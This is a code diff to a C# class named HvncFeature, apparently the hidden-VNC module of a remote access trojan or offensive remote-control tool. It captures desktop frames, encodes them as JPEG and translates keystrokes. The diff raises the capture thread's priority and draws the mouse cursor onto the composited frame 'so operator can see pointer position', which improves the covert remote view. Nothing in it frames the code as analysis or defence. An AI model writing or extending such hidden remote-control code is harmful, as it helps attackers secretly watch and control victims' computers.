@@ -180,6 +180,13 @@ internal static class HvncFeature
     [DllImport("user32.dll", CharSet = CharSet.Unicode)]
     static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[]? lpKeyState, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 
+    [DllImport("user32.dll")] static extern bool GetCursorInfo(ref CURSORINFO pci);
+    [DllImport("user32.dll")] static extern bool DrawIconEx(nint hdc, int xLeft, int yTop, nint hIcon,
+        int cxWidth, int cyWidth, uint istepIfAniCur, nint hbrFlickerFreeDraw, uint diFlags);
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct CURSORINFO { public uint cbSize; public uint flags; public nint hCursor; public POINT ptScreenPos; }
+
     [DllImport("shlwapi.dll")] static extern nint SHCreateMemStream(nint pInit, uint cbInit);
     [DllImport("gdiplus.dll")] static extern int  GdiplusStartup(out nint token, ref GdiplusInput inp, nint output);
     [DllImport("gdiplus.dll")] static extern void GdiplusShutdown(nint token);
@@ -348,7 +355,7 @@ internal static class HvncFeature
         _running = true;
         _captureThread = new Thread(CaptureLoop)
         {
-            IsBackground = true, Name = "HvncCapture", Priority = ThreadPriority.BelowNormal
+            IsBackground = true, Name = "HvncCapture", Priority = ThreadPriority.Normal
         };
         _captureThread.Start();
     }
@@ -595,6 +602,11 @@ internal static class HvncFeature
         }
 
         if (drawn == 0) return null;
+
+        // Render cursor on composite so operator can see pointer position
+        var ci = new CURSORINFO { cbSize = (uint)Marshal.SizeOf<CURSORINFO>() };
+        if (GetCursorInfo(ref ci) && ci.hCursor != 0 && ci.flags != 0)
+            DrawIconEx(_compHdc, ci.ptScreenPos.x, ci.ptScreenPos.y, ci.hCursor, 0, 0, 0, 0, 3 /*DI_NORMAL*/);
 
         // DIBSection is BGRA; GDI+ PixelFormat32bppBGR (0x26200A) matches
         return EncodeJpeg(_compBits, w, h, w * 4);
